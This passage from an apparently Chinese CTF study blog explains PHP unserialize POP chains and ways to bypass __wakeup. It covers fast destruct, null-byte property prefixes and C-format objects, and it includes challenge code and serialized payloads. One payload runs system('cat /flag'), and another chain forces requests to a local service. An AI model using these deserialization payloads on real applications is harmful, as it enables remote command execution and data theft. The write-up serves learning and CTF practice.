class="hljs-variable language_">$this</span>-&gt;ctf-&gt;<span class="hljs-title function_ invoke__">show</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>): <span class="hljs-title">string</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;ctf . <span class="hljs-string">&quot;: Duration of practice: &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;time;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sorry</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hint</span> = <span class="hljs-string">&quot;hint is depend on you&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$password</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;hint = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">secret_code</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$name</span> = <span class="hljs-variable language_">$this</span>-&gt;key;        <span class="hljs-variable">$name</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password == <span class="hljs-variable language_">$this</span>-&gt;name) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hint;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&quot;jay&quot;</span>) &#123;            secret_code::<span class="hljs-title function_ invoke__">secret</span>();        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is our code&quot;</span>;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPassword</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;password;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setPassword</span>(<span class="hljs-params"><span class="hljs-variable">$password</span></span>): <span class="hljs-title">void</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret_code</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$code</span>;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">secret</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;hint.php&quot;</span>;        <span class="hljs-title function_ invoke__">hint</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$num</span> = <span class="hljs-variable">$name</span>;        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$num</span>();    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;code-&gt;secret;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);    <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">setPassword</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>()));&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">show</span>(<span class="hljs-string">&quot;Ctfer&quot;</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fine</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;system&quot;</span>;        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;ls /&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctf</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$time</span> = <span class="hljs-string">&quot;Two and a half years&quot;</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sorry</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hint</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret_code</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;&#125;<span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sorry</span>();<span class="hljs-variable">$d</span>-&gt;key = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fine</span>();<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">secret_code</span>();<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">show</span>();<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sorry</span>();<span class="hljs-variable">$a</span>-&gt;hint = <span class="hljs-variable">$b</span>;<span class="hljs-variable">$b</span>-&gt;ctf = <span class="hljs-variable">$c</span>;<span class="hljs-variable">$c</span>-&gt;code = <span class="hljs-variable">$d</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">##</span>O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sorry&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;hint&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;show&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ctf&quot;</span>;O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;secret_code&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sorry&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;fine&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /flag&quot;</span>;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;hint&quot;</span>;r:<span class="hljs-number">10</span>;&#125;&#125;&#125;</code></pre></div><p>pop链就不讲了（还是有难度的，因为我对private等的理解不够）</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>:<span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sorry&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;hint&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;show&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ctf&quot;</span>;O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;secret_code&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sorry&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;fine&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /flag&quot;</span>;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;hint&quot;</span>;r:<span class="hljs-number">10</span>;&#125;&#125;</code></pre></div><h3 id="相似题目的特殊情况"><a href="#相似题目的特殊情况" class="headerlink" title="相似题目的特殊情况"></a>相似题目的特殊情况</h3><p>上面的题目因为开头是sorry类，所以正好能调用setPassword</p><div class="code-wrapper"><pre><code class="hljs">$a = unserialize($_GET[&#39;pop&#39;]);$a-&gt;setPassword(md5(mt_rand()));</code></pre></div><p>但若调用了个不存在的方法呢</p><div class="code-wrapper"><pre><code class="hljs gams">#这里<span class="hljs-symbol">$</span>FV的类没有loadfile()方法<span class="hljs-meta"><span class="hljs-keyword">$FV</span> = unserialize(base64_decode($path_info));</span><span class="hljs-meta"><span class="hljs-keyword">$FV</span>-&gt;loadfile();</span></code></pre></div><p>题目</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileViewer</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$black_list</span> = <span class="hljs-string">&quot;flag&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$local</span> = <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$a</span></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadfile</span>();        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadfile</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;path))&#123;                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$this</span>-&gt;black_list.<span class="hljs-string">&quot;/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;path))&#123;                    <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-string">&quot;cheems.jpg&quot;</span>);                &#125;<span class="hljs-keyword">else</span>&#123;                    <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-variable">$this</span>-&gt;path);                &#125;            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$this</span>-&gt;local.<span class="hljs-string">&quot;cheems.jpg&quot;</span>);            &#125;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file</span>).<span class="hljs-string">&#x27;&quot;/&gt;&#x27;</span>;        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;            <span class="hljs-variable">$url</span> = <span class="hljs-variable">$path</span>;            <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);            <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);            <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);            <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;local = <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>;        &#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$superhacker</span> = <span class="hljs-string">&quot;hacker.jpg&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goodman</span>(<span class="hljs-params"><span class="hljs-variable">$i</span>,<span class="hljs-variable">$j</span></span>)</span>&#123;            <span class="hljs-variable">$i</span>-&gt;<span class="hljs-variable">$j</span> = <span class="hljs-variable language_">$this</span>-&gt;superhacker;        &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">goodman</span>(<span class="hljs-variable">$this</span>-&gt;a,<span class="hljs-variable">$this</span>-&gt;b);            <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">c</span>();        &#125;    &#125;<span class="hljs-variable">$path_info</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path_info&#x27;</span>];<span class="hljs-variable">$FV</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$path_info</span>));<span class="hljs-variable">$FV</span>-&gt;<span class="hljs-title function_ invoke__">loadfile</span>();</code></pre></div><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#pop链</span>Backdoor::destruct–&gt;FileViewer::__call–&gt;FileViewer::loadfile</code></pre></div><p>可以看到反序列化后的开头类是<code>Backdoor</code> （不太会表述，自行理解一下）</p><p><code>Backdoor</code>没有<code>loadfile()</code>方法</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904113401962.png" alt="image-20230904113401962"></p><h4 id="预期解fast-destruct"><a href="#预期解fast-destruct" class="headerlink" title="预期解fast destruct"></a>预期解fast destruct</h4><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileViewer</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$black_list</span> = <span class="hljs-string">&quot;flag&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$local</span> = <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Backdoor</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$superhacker</span> = <span class="hljs-string">&quot;http://127.0.0.1:65500&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>;            <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-string">&quot;local&quot;</span>;         &#125;     &#125;    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>结果随便改点触发fast destruct即可</p><h4 id="特殊解法"><a href="#特殊解法" class="headerlink" title="特殊解法"></a>特殊解法</h4><p>再实例化一个 <code>FileViewer</code> 对象 将 <code>Backdoor</code> 塞进这个对象的某个属性里（不存在的属性）</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-variable">$a</span>;        <span class="hljs-comment">###FileViewer中没有test属性</span><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));</code></pre></div><p> 先总结一下这道题的做法</p><p>这道题目主要是在<code>loadfile()</code>报错终止程序之前触发<code>__destruct</code>方法（就是预期解）</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904132128523.png" alt="image-20230904132128523"></p><p>可以看到<code>__destruct</code> 比<code>__wakeup</code>还要提前执行（所以可以<code>__wakeup</code>绕过，但这里就不是绕过<code>__wakeup</code>的问题）</p><p>特殊解决方法</p><p><code>loadfile()</code>不会报错，并且由于这里有可以赋值的函数，所以<code>__wakeup</code>的限定已经是废了</p><div class="code-wrapper"><pre><code class="hljs">public function goodman($i,$j)&#123;    $i-&gt;$j = $this-&gt;superhacker;&#125;</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904131915690.png" alt="image-20230904131915690"></p><h4 id="对这道题的个人一些小问题，挺不理解的还是魔法函数的调用顺序问题"><a href="#对这道题的个人一些小问题，挺不理解的还是魔法函数的调用顺序问题" class="headerlink" title="对这道题的个人一些小问题，挺不理解的还是魔法函数的调用顺序问题"></a>对这道题的个人一些小问题，挺不理解的还是魔法函数的调用顺序问题</h4><p>但这里的调用顺序不是很明白</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904131915690.png" alt="image-20230904131915690"></p><p>问了<code>unknown</code>师傅，原来<code>new</code> 了几次<code>Fileviewer</code>就会触发几个<code>__wakeup</code>,然后都在<code>unserialzie</code>之前调用，接着由于是<code>FileViewer</code>类可以调用<code>loadfile()</code>，调用完后程序结束触发<code>__destruct</code></p><h5 id="由此扩展一下"><a href="#由此扩展一下" class="headerlink" title="由此扩展一下"></a>由此扩展一下</h5><p>假设Backdoor中也有<code>__wakeup</code>方法，那会是咋样的呢 </p><p>预期解（fast destruct之后）</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904190051280.png" alt="image-20230904190051280"></p><p>对比之前预期解的结果，可以看到先触发了Fileviewer的<code>__wakeup</code>，再触发了Backdoor的<code>__wakeup</code>，然后执行<code>__destruct</code></p><p>可以绕过报错，但无法绕过<code>__wakeup</code>，。。。。。。。（哎）</p><p>特殊解决方法 的情况</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904194132585.png" alt="image-20230904194132585"></p><p>这backdoor中的__wakeup触发顺序不是很懂</p><p>当我在特殊情况上多套一层</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();<span class="hljs-variable">$a</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$a</span>-&gt;b= <span class="hljs-string">&quot;local&quot;</span>;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-variable">$a</span>;<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$c</span>-&gt;test = <span class="hljs-variable">$b</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904201512660.png" alt="image-20230904201512660"></p><p>是在输出<code>back_wakeup</code>之后多输出了一次<code>__wakup</code></p><p>那我在特殊情况的<code>backdoor</code>里面多套一层<code>new FileViewer</code>呢</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Backdoor</span>();<span class="hljs-variable">$a</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$a</span>-&gt;b= <span class="hljs-string">&quot;local&quot;</span>;<span class="hljs-variable">$a</span>-&gt;c = <span class="hljs-variable">$c</span>;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileViewer</span>();<span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-variable">$a</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904201833235.png" alt="image-20230904201833235"></p><p>由此得出__wakeup函数的触发顺序</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li><code>new</code> 了几次<code>Fileviewer</code>就会触发几个<code>__wakeup</code></li><li>当本类同时有<code>__destruct</code>和<code>__wakeup</code>，fast destruct绕不过去</li><li>有多个<code>__wakeup</code>函数时，触发的顺序是根据payload中的类<strong>由里到外</strong>的顺序</li></ul><h2 id="php-issue-9618-（wakeup与destruct在不同类）"><a href="#php-issue-9618-（wakeup与destruct在不同类）" class="headerlink" title="php issue#9618 （wakeup与destruct在不同类）"></a>php issue#9618 （wakeup与destruct在不同类）</h2><p>原理：</p><p>序列化时<code>protected</code>字段名前面会加上<code>\0*\0</code>的前缀    <code>s:6:&quot;\0*\0end&quot;</code></p><p>序列化时<code>private</code>字段名前面会加上<code>\0类名\0</code>的前缀    <code>s:6:&quot;\0A\0end&quot;</code></p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;    <span class="hljs-keyword">private</span> $end = <span class="hljs-string">&quot;1&quot;</span>;       #<span class="hljs-keyword">private</span>或<span class="hljs-keyword">protected</span>的变量&#125;</code></pre></div><p>由于\0不可见（一般改为%00），上传时会出现数字与字符数量不匹配的情况</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment">#序列化的真实情况</span><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;info&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;znd&quot;</span>;N;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;\0A\0end&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;<span class="hljs-comment">#上传payload</span><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;info&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;znd&quot;</span>;N;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Aend&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;</code></pre></div><p>大概跟字符串报错一个原理</p><p>当在同一个类中时，想要以这样的方式绕过__wakeup是行不通的（而且是无法解析）</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903225210268.png" alt="image-20230903225210268"></p><p>当加入%00时才能输出（但不能绕过）</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903225414998.png" alt="image-20230903225414998"></p><h2 id="使用C绕过"><a href="#使用C绕过" class="headerlink" title="使用C绕过"></a>使用C绕过</h2><p>因为<code>C</code>中不存在<code>__wakeup</code>方法，所以就直接跳过去了</p><p><code>C</code>只能执行<code>construct()</code>函数或者<code>destruct()</code>函数，并且无法添加任何内容</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span 